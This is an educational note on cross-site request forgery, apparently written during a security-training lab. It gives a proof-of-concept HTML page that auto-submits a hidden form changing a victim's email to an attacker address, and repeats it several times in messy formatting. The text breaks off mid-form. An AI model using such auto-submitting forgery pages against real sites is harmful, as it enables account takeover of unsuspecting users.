*This information is only for the purposes of education and skills development. GET and POST are not acronyms.*

Cross site request forgery - Attacker circumvents security measures designed to prevent different websites from interfering with one another, a measure called same origin policy. 

**What:** User persuaded into making an action/change that results in unintentional action. For instance, an attacker creates payload by editing email address change query. When potential victim changes email address, it changes to an email address intended by the attacker instead of the unsuspecting user.

**How:** Three conditions must exist. 
1) Actions such as user changing password, email address or daily usage is exploited by attacker. 
2) Cookie-based session handling to identify user making requests. Also works for HTTP Basic authentication and certificate-based authentication mechanisms as both identify user.
3) Query contains predictable parameters, i.e, should follow some standard or be guessable. 

**Impact**: Attacker manages to gain control of user's account and data. If the user has admin privileges, attacker gains control of entire web application.

**Example:** Attacker finds that all conditions for CSRF are being met for a vulnerable website. As such, they construct a webpage containing a form for changing email address. For instance: 

<html> 
	<body> 
		<form action="https://vulnerable-website.com/email/change" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit(); </script> </body> </html>
<html> 
	<body> 
		<form action="https://vulnerable-website.com/email/change" method="POST"> 
		<input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit(); </script> </body> </html>
<html> <body> <form action="https://vulnerable-website.com/email/change" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit(); </script> </body> </html><html> <body> <form action="https://vulnerable-website.com/email/change" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit(); </script> </body> </html>
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
`<html>`
    `<body>`
        `<form action="https://vulnerable-website.com/email/change" method="POST">`
            `<input type="hidden" name="email" value="pwned@evil-user.net" />`
        `</form>`
        `<script>`
            `document.forms[0].submit();`
        `</script>`
    `</body>`
`</html>`

When a logged in user visits this page, as with any action on the web a HTTP request is triggered. 

**To Launch Attack**: Use CSRF PoC generator on Burp Suite to generate html such as above. Manual creation of html cumbersome but possible:

<html>
	<body>
		<h1>Hello World!</h1>
		<form action=
https://0aef003504f0b79280843afa002400a1.web-security-academy.net/my-account/change-email